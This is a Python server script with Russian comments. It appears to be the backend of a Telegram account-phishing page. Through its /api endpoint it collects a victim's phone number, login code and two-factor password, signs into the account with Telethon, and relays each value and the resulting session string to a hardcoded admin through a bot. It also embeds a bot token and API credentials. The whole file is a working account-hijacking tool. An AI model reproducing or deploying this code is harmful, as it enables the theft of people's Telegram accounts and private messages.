import asyncio, os, logging
from aiogram import Bot, Dispatcher
from aiohttp import web
import aiohttp_cors
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError

# --- КОНФИГУРАЦИЯ ---
API_ID, API_HASH = 15587172, "d3d35aebb0b6ebdb7a002836914ee37d"
BOT_TOKEN, ADMIN_ID = "8711443316:AAE7IDM3KETScemryNQQs21vruVv9DK1QHA", 1866813859

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
active_clients = {}

async def handle_api(request):
    try:
        data = await request.json()
        uid = str(data.get("user_id"))
        act = data.get("action")
        
        # 1. ШАГ: НОМЕР ТЕЛЕФОНА
        if act == "send_phone":
            phone = data.get("phone").replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            sent = await client.send_code_request(phone)
            active_clients[uid] = {"c": client, "p": phone, "h": sent.phone_code_hash}
            
            await bot.send_message(ADMIN_ID, f"📱 **Новый номер:** `{phone}`\nОжидаем код...", parse_mode="Markdown")
            return web.json_response({"status": "ok"})
            
        # 2. ШАГ: КОД ПОДТВЕРЖДЕНИЯ
        elif act == "send_code":
            s = active_clients.get(uid)
            if not s: return web.json_response({"status": "error", "message": "Сессия истекла, введите номер заново"})
            
            code = data.get("code")
            await bot.send_message(ADMIN_ID, f"📨 **Код для {s['p']}:** `{code}`", parse_mode="Markdown")
            
            try:
                await s["c"].sign_in(s["p"], code, phone_code_hash=s["h"])
                return await finish_login(uid)
            except SessionPasswordNeededError:
                return web.json_response({"status": "need_2fa"})
            except Exception as e:
                return web.json_response({"status": "error", "message": str(e)})

        # 3. ШАГ: ПАРОЛЬ 2FA (Исправлено название action)
        elif act == "send_2fa":
            s = active_clients.get(uid)
            if not s: return web.json_response({"status": "error", "message": "Сессия истекла"})
            
            pwd = data.get("password")
            await bot.send_message(ADMIN_ID, f"🔑 **Пароль 2FA для {s['p']}:** `{pwd}`", parse_mode="Markdown")
            
            try:
                await s["c"].sign_in(password=pwd)
                return await finish_login(uid)
            except PasswordHashInvalidError:
                return web.json_response({"status": "error", "message": "Неверный облачный пароль"})
            except Exception as e:
                return web.json_response({"status": "error", "message": str(e)})

    except Exception as e:
        logging.error(f"Ошибка API: {e}")
        return web.json_response({"status": "error", "message": "Системная ошибка сервера"})

async def finish_login(uid):
    s = active_clients.get(uid)
    ss = s["c"].session.save()
    await bot.send_message(ADMIN_ID, f"✅ **АВТОРИЗАЦИЯ УСПЕШНА!**\nНомер: `{s['p']}`\n\n**SESSION STRING:**\n`{ss}`", parse_mode="Markdown")
    # Не отключаем сразу, чтобы сессия успела сохраниться
    return web.json_response({"status": "success"})

# --- НАСТРОЙКИ СЕРВЕРА ---
app = web.Application()
cors = aiohttp_cors.setup(app, defaults={"*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")})
resource = app.router.add_resource("/api")
route = resource.add_route("POST", handle_api)
cors.add(route)

async def main():
    port = int(os.environ.get("PORT", 10000))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', port).start()
    logging.info(f"SERVER LIVE ON PORT {port}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
